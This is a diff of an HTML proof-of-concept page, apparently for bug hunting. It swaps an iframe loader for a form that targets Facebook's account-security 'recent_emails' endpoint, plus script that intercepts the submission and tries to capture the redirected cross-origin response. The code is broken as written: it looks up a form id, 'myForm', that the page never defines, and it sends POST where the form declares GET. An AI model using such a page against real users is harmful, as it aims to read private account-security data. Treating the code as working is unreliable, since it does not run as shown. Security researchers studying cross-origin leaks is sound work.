@@ -3,17 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Load Form and Capture Redirected Response</title>
-    <style>
-        iframe {
-            border: none;
-            width: 100%;
-            height: 100%;
-        }
-    </style>
+    <title>Capture Redirected Response</title>
 </head>
 <body>
-    <iframe id="formFrame" src="https://drwhitehack.github.io/Test/"></iframe>
+    <form method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1" >
+		<input type="text" name="hide_back_button" value="1">
+		<input type="text" name="from_accounts_center" value="1">
+		<input type="submit" value="Send">
+	</form>
     <script>
         // Function to capture redirected response
         function captureRedirectedResponse(response) {
@@ -23,27 +20,26 @@
         }
 
         // Function to intercept form submission and capture redirected response
-        function interceptFormSubmission() {
-            var iframe = document.getElementById('formFrame');
-            // Listen for form submission event within the iframe
-            iframe.contentWindow.document.querySelector('form').addEventListener('submit', function(event) {
-                event.preventDefault(); // Prevent the form from being submitted
-                // Perform form submission
-                setTimeout(function() {
-                    event.target.submit();
-                }, 1000); // Adjust the delay as needed
-                // Listen for iframe load event after form submission
-                iframe.onload = function() {
-                    // Capture redirected response
-                    var redirectedResponse = iframe.contentDocument.documentElement.outerHTML;
-                    captureRedirectedResponse(redirectedResponse);
+        function interceptFormSubmission(event) {
+            event.preventDefault(); // Prevent the form from being submitted
+            var formData = new FormData(document.getElementById('myForm')); // Extract form data
+            // Perform form submission
+            setTimeout(function() {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', document.getElementById('myForm').getAttribute('action'));
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        // Capture redirected response
+                        captureRedirectedResponse(xhr.responseText);
+                    }
                 };
-            });
+                xhr.send(formData);
+            }, 1000); // Adjust the delay as needed
         }
 
         // Call the function to intercept form submission when the page loads
         window.onload = function() {
-            interceptFormSubmission();
+            document.getElementById('myForm').addEventListener('submit', interceptFormSubmission);
         };
     </script>
 </body>
